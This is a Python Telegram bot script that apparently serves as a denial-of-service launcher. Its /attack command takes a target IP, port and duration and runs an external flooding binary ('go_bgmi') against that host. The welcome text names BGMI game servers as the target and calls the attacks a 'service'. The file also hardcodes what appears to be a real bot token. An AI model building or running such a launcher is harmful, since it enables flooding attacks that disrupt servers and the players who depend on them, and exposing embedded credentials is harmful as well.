import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '8104815748:AAFLJpVbuIqjzpi8K6gl5-DO62N9MnJcPs'
ALLOWED_USER_ID = 6110735258
bot_access_free = True  

# Store attacked IPs to prevent duplicate attacks
attacked_ips = set()

async def start(update: Update, context: CallbackContext.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! designed by @theujjwalsingh18🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let's fuck bgmi ! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context: CallbackContext.DEFAULT_TYPE):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./go_bgmi {ip} {port} {duration} 24",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Chala ja BKL \n*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    if ip in attacked_ips:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ This IP ({ip}) has already been attacked!*\n*Try another target.*", parse_mode='Markdown')
        return

    attacked_ips.add(ip)  # Store attacked IP

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Fucking Started! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
